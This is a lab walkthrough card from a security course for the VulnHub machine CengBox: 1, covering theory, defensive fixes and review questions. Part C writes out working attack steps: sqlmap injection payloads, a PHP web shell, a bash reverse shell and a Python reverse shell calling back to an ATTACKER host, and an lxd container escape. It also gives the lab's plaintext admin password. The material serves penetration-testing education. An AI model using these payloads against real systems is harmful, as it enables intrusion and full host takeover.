# Machine 9 — CengBox: 1

> **Position:** 9 of 13 · **Band 3 — Easy** (global rank **018** of 708)
> **Full writeup:** [`labs/3-018-cengbox-1/README.md`](../../labs/3-018-cengbox-1/README.md)

| | |
| --- | --- |
| **Machine** | CengBox: 1 |
| **Author** | Arslan Bilecen |
| **Released** | 30 April 2020 |
| **Target OS** | Ubuntu 18.04 — Apache 2.4.29, PHP, MySQL, a **custom PHP admin panel** |
| **VulnHub** | [entry/cengbox-1,475](https://vulnhub.com/entry/cengbox-1,475/) |
| **Objective** | user flag + root flag |
| **Estimated time** | 5–8 hours |

---

## How to use this card

Parts **A–H**: **A** the theory before you touch anything · **B** what you will learn and the route map · **C** every command, in the order a professional would run it · **D** the defensive fixes · **E** review questions · **F** a hints ladder · **G** references and community notes · **H** what to do when you are completely stuck.

New theory on this machine: **SQL injection done properly** (boolean-blind, time-blind, UNION), **plaintext password storage**, an **extension-only upload filter**, **cron/`pspy`** — and the one lesson that ties all the web findings together: **a control that can be modified by the thing it controls is not a control.**

The whole box in one sentence: a custom PHP admin panel whose login is **SQL-injectable**, whose upload filter checks **only the file extension**, whose administrator password is stored in **plaintext** — and whose "tamper-detection" script is **world-writable** and runs as **root** every few seconds.

---

# Part A — The method (theory)

## A.1 SQL injection done properly

SQL injection happens when user input is **concatenated** into a query string instead of being passed as data. Vulnerable PHP looks like this:

```php
$q = "SELECT * FROM admin WHERE username='" . $_POST['username'] . "' AND password='" . $_POST['password'] . "'";
```

Because `'` closes the string, input like `admin' OR '1'='1` stops being *data* and becomes *query*. There are three core techniques for **proving and exploiting** this, and a professional knows **why** each one works:

| Technique | How it is proven | Trade-off |
| --- | --- | --- |
| **Boolean-blind** | `1=1` vs `1=2` changes the **response** (yes/no) | works everywhere, but needs many requests |
| **Time-blind** | `SLEEP(5)` **delays** the response | works when there is no visible difference, but slow |
| **UNION** | you join your own `SELECT` onto the original | fastest, but needs the right column count |

**`sqlmap`** tries them roughly **in that order** — cheap-and-fast before slow-and-certain — which is why its output shows stages. **A finding is real only after you confirm it**; `sqlmap` gives you **candidates**. And every request sqlmap sends lands in the web server's log: injection testing on a real engagement is something you do *with written permission*.

## A.2 Plaintext password storage

A password column holding `C3ng0v3R00T1!` instead of `$2y$10$…`/`$6$…`/`$argon2id$…` is **plaintext storage**. That is worse than a weak hash: even MD5 at least forces the attacker to do work per password, while plaintext hands them **every administrator instantly** — via injection, a backup, or any read access to the database. Correct storage is `password_hash($pw, PASSWORD_ARGON2ID)` verified with `password_verify()`. Recognition rule for your enum notes: **no recognised hash prefix = plaintext = a reportable finding on its own.**

## A.3 An extension-only upload filter

`upload.php` rejects `.php` and demands `.ceng` ("only CENG File allow" — the error message on the page). **The filter checks the extension string** — and the server **maps `.ceng` to the PHP handler**. Two writeups independently confirm that `.ceng` files execute as PHP, and one shows that a **double extension** (`shell.php.ceng`) also passes, because the filter inspects only the *last* extension. That turns a "documents only" rule into **code execution**. The right question is not "how do I bypass the filter?" but "**what other extension does this server execute as PHP?**" — and the cheap proof, before you upload a weaponised file, is a harmless `phpinfo()` page.

## A.4 Cron, `pspy`, and the "integrity check" that is itself the problem

`ps` shows **what is running right now**; a job that lives for 200 ms every five seconds is easy to miss. **`pspy`** watches `/proc` via `inotify` and logs **every process start/exit** with the full command line and the **UID** — no root, no sudo, no polling needed. Here it reveals `/opt/md5check.py`, running **as root every few seconds** and **mode 777**. Reports describe the script as checking hashes in `/etc/passwd` and reacting when they change — its job is to **detect tampering** — and it is **itself** the tampering vector. **A control that can be modified by the thing it controls is not a control.** The author's own hint on the VulnHub page — *"For root, wait a minute"* — is a wink at this timed job.

---

# Part B — The machine

## B.1 What you will learn

1. **Escalate wordlists** and use the `-X` extension trick with `dirb`.
2. Run `sqlmap` against a **POST form** and read **every stage** of the output.
3. The difference between **boolean-blind / time-blind / UNION** and why `sqlmap` orders them.
4. Why **plaintext** storage is worse than a weak hash — and how to spot it in a dump.
5. Bypass an **extension-only filter** by finding an extension the server **executes** — proving execution with `phpinfo()` first.
6. Use **`pspy`** to see root processes you cannot otherwise see.
7. Exploit a **world-writable script executed by root**.
8. Recognise (but treat as unverified on this box) the alternative path via the **`lxd` group** — see the ⚠️ note in Part G.

## B.2 The map

| Stage | Where |
| --- | --- |
| Content discovery with escalating wordlists | `dirb big.txt` → **`/masteradmin/`**; `-X .php` → `login.php`, `upload.php` |
| **SQLi** | `login.php`, `username` parameter |
| Plaintext credentials | table `admin` in database `cengbox` → `masteradmin : C3ng0v3R00T1!` |
| Upload-filter bypass | `.ceng` is executed as PHP (prove it with `phpinfo()` first) |
| Credential reuse | DB password = system password of **`cengover`** |
| **World-writable root cron script** | `/opt/md5check.py`, mode 777, found via **`pspy`** |
| Alternative (unverified here) | the **`lxd`** group — see ⚠️ note in Part G |

## B.3 Before you start

- [02 — Web Attacks](../02-Web-Attacks.md) **§4** (SQL injection) and §5 (file upload).
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§4** (cron) and **§8** (groups — `lxd`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §5 (reuse).

**Answer before you start (solutions are in Part F):**

1. A login form has two POST fields. How do you tell `sqlmap` to test them without hand-crafting a request?
2. What is the **observable** difference between **boolean-blind** and **time-blind**?
3. A filter says "only `.ceng`". What is your **first** question about the server's configuration?
4. Why is a plaintext secret worse than a fast hash?
5. `ps aux` shows nothing unusual. What tool would show you a root process running 200 ms every 5 seconds?

---

# Part C — The walkthrough, step by step

## Step 1 — Scan

Theory first: two discovery phases — **which ports are open** (`-p-` = all 65,535), then **what exactly is running on them** (`-A` = version detection, OS guess, default scripts). Save everything with `-oN`: your future self needs the notes.

```bash
sudo nmap -A -p- -T4 -oN scans/cengbox.txt TARGET
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: CengBox
```

**How to read it.** `-T4` speeds the scan up (4 of 5; safe on a lab LAN). `OpenSSH 7.6p1 Ubuntu` + `Apache 2.4.29` pin **Ubuntu 18.04** — so you know the toolchain (PHP, MySQL) and can predict where misconfigurations live. Two ports, and 22 has no known 18.04 default hole: the **entire attack lives in the web application**. That decision — "where do I spend my hours?" — is the real output of this step.

## Step 2 — Content discovery, and why the small list fails

Theory: the homepage tells you nothing, so you **fuzz for hidden paths** — request thousands of guessable names and keep the ones the server answers differently. `dirb` is the classic tool; its *wordlist* decides what it can possibly find.

```bash
curl -s http://TARGET/ | head -30
dirb http://TARGET/ /usr/share/wordlists/dirb/common.txt
dirb http://TARGET/ /usr/share/wordlists/dirb/big.txt
```

```text
==> DIRECTORY: http://TARGET/uploads/
```
```text
==> DIRECTORY: http://TARGET/masteradmin/
==> DIRECTORY: http://TARGET/uploads/
```

**How to read it.** `common.txt` (≈4.6k words) **missed** `/masteradmin`; `big.txt` (≈20k) found it. **That is the lesson of phase one: `common.txt` is not enough.** The progression worth memorising: `common.txt` (4.6k) → `big.txt` (20k) → `directory-list-2.3-medium.txt` (220k) → SecLists. **Escalate before concluding a box is bare** — two writeups here report the default list found nothing usable. Visiting `/masteradmin/` may show an error or forbidden page; that still proves the directory **exists**, which is all you need right now.

Now enumerate **inside** the new directory, with the extension filter. `-X .php` **appends the extension to every word** (equivalent to `gobuster -x php`) — you are guessing *files*, not just directories, and on a PHP server that is where the login and upload logic hide.

```bash
dirb http://TARGET/masteradmin/ /usr/share/wordlists/dirb/big.txt -X .php
```

```text
+ http://TARGET/masteradmin/login.php (CODE:200|SIZE:1194)
+ http://TARGET/masteradmin/adb.php (CODE:302|SIZE:0)
+ http://TARGET/masteradmin/upload.php (CODE:302|SIZE:0)
```

**How to read it.** `login.php` at `200` with a real size is the form you can interact with; `upload.php`/`adb.php` at `302` with `SIZE:0` **redirect** because you are not authenticated — their **existence** is known even though you cannot see their content. Two interesting surfaces: a **login** (injection candidate) and an **upload** (RCE candidate). You now have your attack plan.

## Step 3 — Let `sqlmap` find the injection

Theory: you could test `login.php` by hand — add `'`, watch for a SQL error, try `OR 1=1` — but automation tests hundreds of payload variants per parameter. `sqlmap` needs to know **where the input goes**: `--forms` makes it parse the `<form>` itself and test every field, so you never touch Burp. (Alternative route used by two writeups: intercept the login request in Burp Suite, save it to a file, and run `sqlmap -r request.txt` — same result, more control.)

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

```text
[INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] target URL appears to be UNION injectable with 3 columns
Parameter: username (POST)
    Type: boolean-based blind
    Payload: username=admin' AND 1=1-- -&password=x
    Type: time-based blind
    Payload: username=admin' AND SLEEP(5)-- -&password=x
    Type: UNION query
    Payload: username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7871,...)-- -&password=x
```

**How to read it.** Every flag is a decision: `--forms` reads the `<form>` and tests every field; `--batch` never prompts (it accepts all defaults — fine in a lab, but read what it accepted); `--level 3` also tests `User-Agent`/`Referer`/cookies; `--risk 2` allows more aggressive payloads (**risk 3 adds heavy, intrusive conditions that can stress or alter data — not for production without a change window**). Read the three techniques as **three independent proofs** on the **same** parameter: the injection is real, deep, and exploitable every way. Note the trailing `-- -` in each payload: SQL's "comment out the rest" marker, so your injection does not break the query syntax — that is what a well-formed payload looks like.

## Step 4 — Dump the database

Theory: prove → enumerate → extract. `sqlmap` caches every confirmation from Step 3, so you can jump straight to listing databases, tables and rows. `-p username` pins the parameter you already proved so it does not waste time re-testing headers.

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --data="username=a&password=b" -p username --batch --dbs
sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox --tables
sqlmap -u "..." --data="username=a&password=b" -p username --batch -D cengbox -T admin --dump
```

```text
| id | username    | password      |
| 1  | masteradmin | C3ng0v3R00T1! |
```

**How to read it.** `--dbs` lists databases; `-D --tables` lists tables; `-T --dump` prints rows. The database is `cengbox`; the credentials table is **`admin`** (⚠️ some older notes call it `users` — verified writeups show `admin`; see Part G). Expect `--dump` to be **slow**: the confirmed injection is partly time-based, and every leaked character costs a `SLEEP()` — the trade-off from Part A.1 made real. **Read the schema, not just the rows:** a `password` column holding `C3ng0v3R00T1!` has no hash prefix = **plaintext** (Part A.2). The database also holds an `uploads` table listing `.ceng` files — that extension is your next step.

Log in at `/masteradmin/login.php` as `masteradmin` / `C3ng0v3R00T1!`.

## Step 5 — The `.ceng` filter

Theory: an authenticated upload is the fastest path to code execution. Before weaponising anything, **understand the filter**. Try a `.php` file first — the page tells you only CENG files are allowed. Two lessons: **read the error message** (one writeup lost significant time because the error was easy to miss on a dim screen), and **prove execution with a harmless `phpinfo()` file** before uploading a shell.

```bash
echo '<?php phpinfo(); ?>' > info.ceng
curl -s -b cookies.txt -F "file=@info.ceng" http://TARGET/masteradmin/upload.php
curl -s http://TARGET/uploads/info.ceng | head -5        # a PHP info page = execution proven

cat > shell.ceng <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -s -b cookies.txt -F "file=@shell.ceng" http://TARGET/masteradmin/upload.php
curl -s "http://TARGET/uploads/shell.ceng?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How to read it.** `-F "file=@shell.ceng"` sends `multipart/form-data` (the encoding a browser uses for file uploads); `-b cookies.txt` replays your authenticated session. Uploads land in `/var/www/html/uploads/` — **inside the web root**, which is why browsing to the file *executes* it. **The filter checks the extension string, and the server maps `.ceng` to PHP** — one writeup even shows `shell.php.ceng` passing, because only the last extension is inspected. `uid=33(www-data)` is the expected landing zone: the web server's own low-privilege user.

## Step 6 — Reverse shell and TTY upgrade

Theory: `?cmd=` gives one-shot command execution, but you want a **real shell**. Every reverse shell, in every language, does three things: **connect back to you → point stdin/stdout/stderr at the socket → exec a shell**. The URL below builds that payload in Python and **URL-encodes** it in one go.

```bash
nc -lvnp 4444                                     # Kali, first — or you will miss the callback
curl -s "http://TARGET/uploads/shell.ceng?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**How to read it.** `nc -lvnp 4444`: **l**isten, **v**erbose, **n**o DNS, **p**ort 4444 — start it **before** triggering the payload. **URL-encoding is not optional** — `&`, `>` and spaces are meaningful or illegal in a query string; without encoding the payload is silently truncated at the first `&` and you get a confusing half-failure. `bash -i >& /dev/tcp/HOST/PORT 0>&1` is bash's built-in TCP redirection: interactive shell in, both directions on one socket. `pty.spawn("/bin/bash")` then upgrades to a pseudo-terminal so programs like `su` behave. **Full TTY upgrade** (worth memorising): press `Ctrl-Z` to background the shell, run `stty raw -echo`, then `fg` — arrow keys, tab-completion and Ctrl-C now work. Some writeups use Metasploit's `php/meterpreter/reverse_tcp` (`multi/handler`, `web_delivery`) instead — a valid alternative, but the hand-built shell teaches you what the framework hides.

## Step 7 — Credential reuse

Theory: you are `www-data`, the lowest of the low. Enumerate **who exists** on the box — entries in `/etc/passwd` with UID 1000+ are real human users — then test the most common bad habit in the industry: **reusing a password across systems**.

```bash
cat /etc/passwd | grep -E ':(1000|1001):'
su cengover
id
cat /home/cengover/user.txt
```

```text
cengover:x:1000:1000:cengover,,,:/home/cengover:/bin/bash
```
```text
uid=1000(cengover) gid=1000(cengover) groups=1000(cengover),110(lxd)
```

**How to read it.** The `passwd` fields are `name:password:UID:GID:comment:home:shell`; `x` means the real hash lives in `/etc/shadow` (unreadable to you); UID 1000 = the first human account. `su cengover` prompts for a **password** — and **the plaintext database password `C3ng0v3R00T1!` also works for the system account**: credential reuse, enabled by the plaintext storage from Step 4. That gets you the **user flag** (`user.txt`). And read `id` closely: **`groups=…,110(lxd)`** — membership in `lxd`/`docker` is normally **root-equivalent**. On this box it is an *alternative* route; the documented route is Step 8–9, and the ⚠️ note in Part G explains why you should treat the `lxd` path as unverified here.

## Step 8 — Escalation: `pspy` shows the root cron

Theory: to get root you need something that **runs as root and you can influence**. System-wide cron jobs are the classic candidate. `/etc/crontab` fields are `min hour dom mon dow` **`user`** `command` — the **user** column is what makes a system cron run as root. Check all the usual places; here they are all stock.

```bash
crontab -l; cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d/
```

```text
no crontab for cengover
```

Standard privesc enumeration also includes SUID binaries — `find / -perm -u=s -type f 2>/dev/null`, checked against [GTFOBins](https://gtfobins.github.io/). One writeup reports it is a **dead end** here (only `/usr/bin/at` catches the eye, and it refuses to run): not every check leads somewhere, and that is normal. The scheduled job you cannot see with `ps` needs a better observer: **`pspy`**.

```bash
python3 -m http.server 8000                       # Kali, in the directory holding pspy64
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```text
2024/05/04 19:02:11 CMD: UID=0  PID=1842 | /usr/bin/python /opt/md5check.py
2024/05/04 19:02:16 CMD: UID=0  PID=1845 | /usr/bin/python /opt/md5check.py
```

**How to read it.** `UID=0` = root; timestamps exactly **5 seconds apart** = a timed job. `pspy` does not care **how** the job is scheduled — cron, systemd timer, anything — it reports that it **runs**, with the full command line. (Note `chmod +x`, not the `chmod 777` some writeups use: you only need the execute bit, and 777 on your own tools normalises the exact misconfiguration you are hunting.)

```bash
ls -l /opt/md5check.py
```

```text
-rwxrwxrwx 1 root root 612 Oct 19 15:40 /opt/md5check.py
```

**How to read it.** **`-rwxrwxrwx` — mode 777**: owner, group **and everyone else** can read, write and execute. A root script, executed **by root** every five seconds, that **any user can overwrite**. That is the entire escalation. The irony is worth internalising: the script's job is to **detect** tampering with the system's password data, and it **is** the tampering vector — because it can be modified by the very users it is supposed to police.

## Step 9 — Replace it with a reverse shell

Theory: you will overwrite a root-executed file, so **discipline first** — keep a backup so the box works for the next learner. Then the same three-step reverse shell as Step 6, this time in Python, because the cron runs `/usr/bin/python`.

```bash
cp /opt/md5check.py /tmp/md5check.py.bak        # ALWAYS keep a copy first
cat > /opt/md5check.py <<'EOF'
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
# nc -lvnp 4444  -> root within seconds (the author says: wait a minute)
```

**How to read it.** Line by line: create a TCP socket → connect back to you → `os.dup2(fd, 0/1/2)` points **stdin, stdout, stderr** at the socket → `subprocess.call` starts bash, which inherits those three file descriptors. **Every reverse shell in every language is those three steps: connect → redirect stdio → exec a shell.** `/usr/bin/python` on Ubuntu 18.04 is **Python 2**, so the payload deliberately uses syntax valid in both 2 and 3. Start `nc -lvnp 4444` **before** the cron fires — waiting up to ~a minute is normal (the author's hint again).

```bash
cat /root/root.txt
cp /tmp/md5check.py.bak /opt/md5check.py && ls -l /opt/md5check.py    # restore
```

**Root flag** in `/root/root.txt`. Restore the script — hygiene is part of the grade in any lab shared with a class.

## Step 10 — Alternative: the `lxd` group (unverified on this box)

⚠️ **Verification note:** the standard `lxd`-group escape is shown below because `cengover` is in group `lxd` (Step 7) and the technique is universally applicable — but **none of the verified writeups reproduce it on CengBox 1**; they all escalate via `/opt/md5check.py`. Treat this as a *technique to learn*, not a confirmed second path on this machine.

```bash
lxc image import ./alpine.tar.gz --alias privesc
lxc init privesc escape -c security.privileged=true
lxc config device add escape host disk source=/ path=/mnt/root recursive=true
lxc start escape && lxc exec escape -- /bin/sh
cat /mnt/root/root/root.txt
```

**How to read it.** **Every flag is load-bearing:** `-c security.privileged=true` **disables the user namespace**, so container root **is** host root; `disk source=/ path=/mnt/root recursive=true` **bind-mounts the host's entire `/`** into the container at `/mnt/root`. The image must be built on your attacking machine (`build-alpine` from `saghul/lxd-alpine-builder`) and transferred to the target — a step beginners forget. **Treat the `lxd` and `docker` groups as root — because they are.**

---

# Part D — Defensive lessons

| Finding | Fix |
| --- | --- |
| Guessable `/masteradmin/` directory | Directory obscurity is not a control. Authenticate it, or place it behind a VPN/IP allow-list |
| **SQL injection in `login.php`** | **Parameterised queries / prepared statements.** A WAF rule as a stopgap only |
| **Plaintext admin password** | bcrypt/argon2 + salt. A plaintext column is a reportable incident even without a breach |
| Extension-only upload filter | Validate **content** (magic bytes), store uploads **outside the document root**, serve with a non-executing handler |
| `.ceng` mapped to the PHP handler | Remove unnecessary `AddHandler`/`AddType` mappings |
| Uploads inside `/var/www/html/uploads/` | Move to a non-executing location; `php_admin_flag engine off` for that directory |
| DB password reused as a system password | Unique credentials per system; use a secrets manager |
| **`/opt/md5check.py` mode 777, run by root** | `chmod 700`, owner `root`. Never let a root-executed script be writable by anyone else |
| A "tamper detection" script that is itself writable | Integrity controls must be **immutable** — AIDE/Tripwire with the database stored off-host |
| `lxd` group for an ordinary user | Remove the membership. `lxd`/`docker` is root-equivalent |

**The single biggest lesson:** *a control that can be modified by the thing it controls is not a control.* True of `md5check.py` (root's own guard script, writable by everyone), of an extension-only upload filter (the attacker chooses the filename), and of a plaintext password column (the database *is* the password store, and the database is what got breached).

---

# Part E — Review questions

1. `sqlmap` reported several techniques. Which did it confirm **first**, and why is that order sensible?
2. Explain **boolean-blind** in your own words: what is the attacker observing, and why does it take many requests?
3. Why `--level 3 --risk 2` rather than the defaults? What are the risks of raising them further on production?
4. The admin password was plaintext. Better or worse than unsalted MD5, **from the defender's point of view**?
5. Why did `.ceng` execute as PHP? Where was the real vulnerability — the filter or the server config? How would `phpinfo()` have told you that in 30 seconds?
6. What does `pspy` do that `ps` cannot? Why is that essential for short-lived cron jobs?
7. The script was named `md5check.py` — an *integrity* control. Why did it fail, and what would a real one look like?
8. Name three separate mistakes on this box that each, on their own, led to full compromise.

---

# Part F — Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Ports 22 and 80. The homepage says nothing. Run `dirb` with a **large** list (`big.txt` — `common.txt` will not find anything useful here) and look for an administration directory. Then `dirb` **again inside it**, this time with the `-X .php` extension flag.
</details>

<details>
<summary><strong>Rung 2 — the panel and the injection</strong></summary>

`dirb http://TARGET/masteradmin/ … -X .php` → `login.php`, `upload.php`. Then `sqlmap --forms --level 3 --risk 2` on `login.php`. Afterwards `--dbs`, `-D cengbox --tables`, `-T admin --dump` → `masteradmin : C3ng0v3R00T1!` (plaintext — no hash prefix).
</details>

<details>
<summary><strong>Rung 3 — the upload filter</strong></summary>

`upload.php` refuses `.php` and demands `.ceng` — **read the error message at the top of the page**. The server **executes** `.ceng` as PHP; prove it by uploading `info.ceng` containing `phpinfo()` first. Then upload `shell.ceng` → it lands in `/var/www/html/uploads/` → you are `www-data`.
</details>

<details>
<summary><strong>Rung 4 — user flag and root</strong></summary>

The plaintext DB password is reused: `su cengover` → user flag in `/home/cengover/user.txt`. For root, `ps` is blind to short-lived jobs — run **`pspy`** → `/opt/md5check.py` as root, mode 777 → back it up, replace it with a Python reverse shell, wait for the cron → root. (Alternative: the `lxd` group — unverified on this box, see Part G.)
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap` → **22, 80**. 2. `dirb big.txt` → `/masteradmin/`; `-X .php` → `login.php`/`upload.php`.
3. `sqlmap --forms` → database `cengbox`, table `admin` → `masteradmin : C3ng0v3R00T1!` (plaintext).
4. `upload.php` → `shell.ceng` (`.ceng` executes as PHP) → `www-data`. 5. `su cengover` → user flag.
6. `pspy` → `/opt/md5check.py` (mode 777, UID 0, every 5 s) → overwrite with a reverse shell → root.
</details>

---

# Part G — References

- **VulnHub entry:** <https://vulnhub.com/entry/cengbox-1,475/>
- **English lab:** [`labs/3-018-cengbox-1/README.md`](../../labs/3-018-cengbox-1/README.md)
- **Greek mirror of this card:** [`Μηχανές/09-cengbox-1.md`](../../Μαθησιακή%20Διαδρομή%201%20-%20Εισαγωγή%20στην%20Κυβερνοασφάλεια/Μηχανές/09-cengbox-1.md)
- **Cross-checked writeups** (confirm `masteradmin:C3ng0v3R00T1!`, `.ceng`, `md5check.py`):
  - [HackNos — CengBox 1](https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/)
  - [Hacking Articles — CengBox 1](https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/)
  - [Bootlesshacker — CengBox](https://www.bootlesshacker.com/cengbox-ctf-walkthrough/)

- **Community notes — consensus, pitfalls and alternative routes** (cross-checked against the sources below):
  - **Consensus chain:** nmap (`22/80`) → `dirb` with `big.txt` → `/masteradmin/` → `dirb ... -X .php` → `login.php`/`upload.php` → `sqlmap --forms` SQLi on `login.php` → dump DB `cengbox` (credentials table **`admin`**) → `masteradmin:C3ng0v3R00T1!` → login → upload a `.ceng` shell (executed as PHP) → `www-data` → `su cengover` (DB password = system password) → `pspy` → overwrite `/opt/md5check.py` (777, root cron) → root.
  - **Common pitfall:** `common.txt` (and even a default `dirb` run) misses `/masteradmin/` — escalate the wordlist to `big.txt` first, then re-run with `-X .php`. Two writeups report the default list found nothing usable.
  - **Common pitfall:** uploads silently "fail" because only `.ceng` is accepted — one writeup lost significant time simply not seeing the error message at the top of the page. Read every error before assuming a dead end.
  - **Common pitfall:** `--dump` is painfully slow because the confirmed injection is partly time-based (every character costs a `SLEEP()`), so read `--tables` first and dump targeted tables (`-D cengbox -T admin`), not `--dump-all`.
  - **Alternative tooling:** sqlmap can be fed a Burp-intercepted request (`sqlmap -r request.txt`) instead of `--forms`, and the shells can be Metasploit `php/meterpreter/reverse_tcp` / `python/meterpreter` payloads (`multi/handler`, `web_delivery`) instead of hand-built netcat reverse shells — same endpoints, different toolkit.
  - **Dead end (documented):** SUID enumeration (`find / -perm -u=s`) yields nothing usable; `/usr/bin/at` is present but refuses to run. Not every standard check pays off — keep going.
  - **⚠️ Verification note:** the credentials table is named **`admin`**, not `users`, and the `lxd` group escape this card mentions is **not** reproduced by the verified writeups — the documented root path is the world-writable `/opt/md5check.py` (root cron, mode 777).
  - **Naming confusion:** one writeup (Bootlesshacker) calls the shell user `cengbox`; HackNos and Hacking Articles — and the box itself — use **`cengover`**.
  - **Hygiene:** back up `/opt/md5check.py` before overwriting and restore it afterwards so the box works for the next learner. `chmod +x` is enough for pspy — do not `chmod 777` your own tools.
  - **Verified sources:** [Hacking Articles](https://www.hackingarticles.in/cengbox-1-vulnhub-walkthrough/) · [HackNos](https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/) · [Bootlesshacker](https://www.bootlesshacker.com/cengbox-ctf-walkthrough/)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- **`big.txt` first** — `common.txt` will miss `/masteradmin/`.
- Uploads rejected? **Look at the error message** at the top of `upload.php` — it names the only accepted extension.
- If `sqlmap --dump` seems hung, it is probably time-based extraction — wait, or narrow with `-D cengbox -T admin`.
- If `su` fails, you have no TTY — redo `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
- Nothing on root after overwriting `md5check.py`? Check your listener is up (`nc -lvnp 4444`) and wait a minute — the cron is timed, and the author said so: *"For root, wait a minute."*
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · next: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · full writeup: [`labs/3-018-cengbox-1`](../../labs/3-018-cengbox-1/README.md)._
